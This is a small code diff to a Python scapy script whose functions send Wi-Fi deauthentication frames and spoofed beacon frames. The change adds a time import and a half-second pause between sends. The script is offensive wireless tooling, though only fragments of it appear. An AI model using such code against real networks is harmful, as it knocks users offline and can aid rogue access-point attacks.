@@ -1,4 +1,5 @@
 from scapy.all import sendp, Dot11, RadioTap, Dot11Deauth, Dot11Beacon, Dot11Elt
+import time
 
 
 def deauth(iface: str, BSSID: str, client: str, reason: int = 7):
@@ -34,3 +35,4 @@ def deauth_with_beacon(iface: str, SSID: str, deauth_BSSID: str, deauth_client: 
         print(f'SENDING DEAUTH to {deauth_BSSID}')
         sendp(beacon_packet, iface=iface, count=1)
         print(f'SENDING BEACON for {beacon_BSSID}')
+        time.sleep(0.5)
